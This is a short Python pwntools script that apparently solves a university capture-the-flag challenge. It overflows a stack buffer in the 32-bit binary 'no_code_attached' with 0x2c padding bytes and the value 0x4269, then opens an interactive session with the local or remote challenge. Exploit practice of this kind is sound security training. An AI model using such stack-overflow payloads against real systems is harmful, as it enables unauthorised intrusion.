#!/usr/bin/python3

"""
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
"""

binary_path = "./no_code_attached"
remote_addr = ('pwn.ctf.unswsecurity.com', 7000)

#############################
from pwn import *;DEBUG=context.log_level==logging.DEBUG;p=process(binary_path);elf=p.elf;p=remote(*remote_addr) if args["REMOTE"] else p;
#############################

p.sendline(b"." * 0x2c + p32(0x4269))

p.interactive()
